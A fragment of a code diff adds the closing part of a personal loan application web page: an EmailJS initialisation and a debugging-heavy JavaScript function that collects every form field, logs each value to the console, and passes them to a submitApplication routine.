+            emailjs.init("nW8qV4aakkEtYlieZ");
+        })();
+    </script>
+    <script src="script.js?v=8"></script>
+    <script>
+        function submitPersonalLoanForm() {
+            console.log('submitPersonalLoanForm() called!');
+            
+            // Check if submitApplication function exists
+            if (typeof submitApplication === 'undefined') {
+                console.error('submitApplication function is not defined!');
+                alert('Error: submitApplication function not found. Please check console.');
+                return;
+            }
+            
+            console.log('submitApplication function exists, proceeding...');
+            
+            // Collect ALL personal loan data using querySelectorAll to get all fields
+            const allInputs = document.querySelectorAll('input, select');
+            const data = {};
+            
+            console.log('Found inputs:', allInputs.length);
+            
+            // Collect all input values
+            allInputs.forEach(input => {
+                if (input.id && input.type !== 'checkbox') {
+                    data[input.id] = input.value || '';
+                    console.log('Collected:', input.id, '=', input.value);
+                }
+            });
+            
+            // Add application details
+            data.submissionDate = new Date().toLocaleString();
+            data.applicationType = 'Personal Loan Application';
+            data.applicationStatus = 'Personal loan submitted successfully';
+            
+            console.log('Final data object:', data);
+            
+            // Call the original submitApplication function
+            try {
+                submitApplication(data);
+                console.log('submitApplication called successfully');
+            } catch (error) {
+                console.error('Error calling submitApplication:', error);
+                alert('Error submitting application: ' + error.message);
+            }
+        }
+        
+        // Test function availability
+        console.log('Script loaded, submitPersonalLoanForm function defined');
+        console.log('submitApplication function:', typeof submitApplication);
+    </script>
+</body>
+</html>
